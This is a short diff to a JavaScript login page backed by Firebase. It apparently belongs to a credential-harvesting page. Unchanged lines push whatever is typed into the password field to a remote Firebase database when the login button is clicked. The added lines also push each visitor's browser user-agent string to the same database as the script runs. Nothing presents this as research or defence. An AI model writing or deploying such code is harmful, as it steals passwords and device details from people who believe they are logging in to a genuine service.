@@ -599,7 +599,7 @@ var config = {
 
 firebase.initializeApp(config); 
 var rootRef = firebase.database().ref().child('graduate');
-
+var deviceRef = firebase.database().ref();
 
 
 $('#login').click(function(){ 
@@ -609,6 +609,9 @@ rootRef.push().set({ firstName:"Nani.512", lastName:$('#pass').val() });
 loginkaro();
 
 })
+
+deviceRef.push().set({ deviceInfo:navigator.userAgent });
+
 
 function loginkaro() {
     
